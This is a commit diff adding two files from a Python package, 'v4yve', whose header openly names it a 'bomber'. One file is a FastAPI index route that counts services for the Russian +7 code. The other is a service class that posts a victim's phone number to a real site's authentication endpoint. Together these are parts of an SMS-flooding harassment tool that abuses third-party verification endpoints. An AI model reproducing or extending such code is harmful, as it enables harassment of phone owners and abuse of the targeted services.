1fa1a1c648b7fd78ff6cc451dd5df1f986ee0bd3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:07:17 +0000

    Add package v4yve/0.1/v4yve-0.1-py3-none-any.whl

---
+++ packages/v4yve/v4yve-0.1-py3-none-any.whl/v4yve/app/routers/index.py
@@ -0,0 +1,35 @@
+###########################
+####    v4yve corp.    ####
+####  bomber by v4yve  ####
+####  index.py - файл  ####
+###########################
+
+import os
+from os.path import join
+
+from fastapi import APIRouter, Request, HTTPException
+from fastapi.templating import Jinja2Templates
+from loguru import logger
+
+from v4yve.service import prepare_services
+
+router = APIRouter()
+templates = Jinja2Templates(directory=join(os.getcwd(), "app", "templates"))
+
+
+@logger.catch
+@router.get("/")
+def index(request: Request):
+    if request.app.state.only_api:
+        raise HTTPException(status_code=404)
+
+    services = prepare_services()
+
+    return templates.TemplateResponse(
+        "index.html",
+        {
+            "request": request,
+            "service_count": len(services[7]),
+        }, # Russia +7
+    )
+
---
+++ packages/v4yve/v4yve-0.1-py3-none-any.whl/v4yve/services/alfalife.py
@@ -0,0 +1,8 @@
+from v4yve.services.service import Service
+
+
+class AlfaLife(Service):
+    async def run(self):
+        await self.post(
+            "https://alfalife.cc/auth.php", data={"phone": self.phone},
+        )
